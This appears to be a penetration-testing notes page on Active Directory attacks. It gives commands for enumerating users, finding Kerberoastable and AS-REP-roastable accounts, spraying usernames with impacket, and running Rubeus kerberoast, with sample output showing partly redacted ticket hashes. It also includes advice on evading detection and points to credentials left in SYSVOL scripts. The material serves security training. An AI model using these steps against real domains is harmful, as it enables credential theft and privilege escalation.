# Active Directory

## Domain Enumeration

Enumeration of users within a domain using various ways:

* Native Windows tools:
  * net.exe

```powershell
C:> net user /dom
```

```powershell
C:> net group /dom
```

*   With RDP access to a compromised machine, the GUI panel "Search Active Directory" from File Explorer can be used:\
    &#x20;

    <figure><img src="../.gitbook/assets/gui-ad-search-explorer.png" alt="" width="526"><figcaption></figcaption></figure>

## Kerberoasting / AsrepRoasting

Using PowerView enumeration of users which have a set `ServicePrincipalName` attribute would be considered service accounts regardless if they're actually used with any service within a domain.

As such, they're considered a good target for Kerberoasting attacks.&#x20;

Similarly, user objects which have the `userAccountControl` attribute set to `1.2.840.113556.1.4.803:=4194304` are considered as targets for AsrepRoasting.&#x20;

* Finding users with a configured `servicePrincipalName` attribute within Active Directory (excluding the `krbtgt` account:

<pre class="language-powershell"><code class="lang-powershell"><strong>PS: > Get-DomainUser -LDAPFilter "(&#x26;(objectClass=user)(servicePrincipalName=*)(!(samaccountname=krbtgt)))"
</strong></code></pre>

* Finding users with a `userAccountControl` attribute value allowing for AsrepRoasting:

```powershell
PS: > Get-DomainUser -LDAPFilter "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
```

Same filters can be used with `ldapsearch` on Linux.

In the case where an attacker doesn't have a valid user wordlist which exist in the target domain, a generalised wordlist of usernames following the format of the target domain for usernames, can be used to spray them and determine if they have a configured value for `Do not require preauthentication` attribute.

A list of usernames can be obtained from [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames).

```bash
$ impacket-GetNPUsers -no-pass -usersfile jsmith.txt target.domain.local/
```

Using known .NET tools can be used as well which can be loaded from a C2 using methods such as `inline-execute`.

Alternatively, if access is already obtained on a target via psexec, winrm or alternative method, the following tools can be used:

* Rubeus (obtain statistiscs)

```powershell
PS: > C:\Windows\Tasks\Rubeus.exe kerberoast /stats

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1


[*] Action: Kerberoasting

[*] Listing statistics about target users, no ticket requests being performed.
[*] Target Domain          : us.techcorp.local
[*] Searching path 'LDAP://target.domain.local/DC=target,DC=domain,DC=local' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 3


 -------------------------------------
 | Supported Encryption Type | Count |
 -------------------------------------
 | RC4_HMAC_DEFAULT          | 3     |
 -------------------------------------

 ----------------------------------
 | Password Last Set Year | Count |
 ----------------------------------
 | 2019                   | 1     |
 | 2021                   | 1     |
 | 2024                   | 1     |
 ----------------------------------
```

* Rubeus (kerberoast all users with SPN value)

> OPSEC: performing targeted kerberoasting or asreproasting is considered better for opsec. Performing kerberosting on all users in a domain with SPN will trigger lots of detections.

```powershell
PS: > C:\Windows\Tasks\Rubeus.exe kerberoast


   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : target.domain.local
[*] Searching path 'LDAP://target.domain.local/DC=target,DC=domain,DC=local' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 3


[*] SamAccountName         : svcVeeamadm
[*] DistinguishedName      : CN=svcveeamadm,CN=Users,DC=target,DC=domain,DC=local
[*] ServicePrincipalName   : cifs/svcVeeamadm
[*] PwdLastSet             : 7/16/2019 12:03:27 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*svcVeeamadm$target.domain.local$cifs/svcVeeamadm@target.domain.l
                             ocal*$B9BE5FA[REDACTED]


[*] SamAccountName         : svchttp01
[*] DistinguishedName      : CN=svchttp01,CN=targeters,DC=target,DC=domain,DC=local
[*] ServicePrincipalName   : svchttp01/target-jump.target.domain.local
[*] PwdLastSet             : 1/8/2021 5:50:35 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*svchttp01$target.domain.local$svchttp01/target-jump.target.domain.local@target
                             .domain.local*$40146CAC3[REDACTED]

[*] SamAccountName         : dssServ
[*] DistinguishedName      : CN=dssServ,CN=Users,DC=us,DC=domain,DC=local
[*] ServicePrincipalName   : http/machine01
[*] PwdLastSet             : 7/2/2024 1:25:57 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*dssServ$target.domain.local$http/machine01@target.domain.local*$7C2C5
                             3B4B0F27EB99DF86C7F5A036[REDACTED]
```

## Credentials in SYSVOL

SYSVOL and NETLOGON shares on domain controllers are used often by developers and system administrators to store scripts which may likely contain hardcoded credentials. These credentials can be used to escalate privileges either horizontally or vertically within a domain environment.

A good resource for understanding this concept can be found here: [https://adsecurity.org/?p=2288](https://adsecurity.org/?p=2288) (Image obtained from adsecurity.org)

<figure><img src="../.gitbook/assets/VBS-Scripts-In-SYSVOL.jpg" alt=""><figcaption></figcaption></figure>

&#x20;
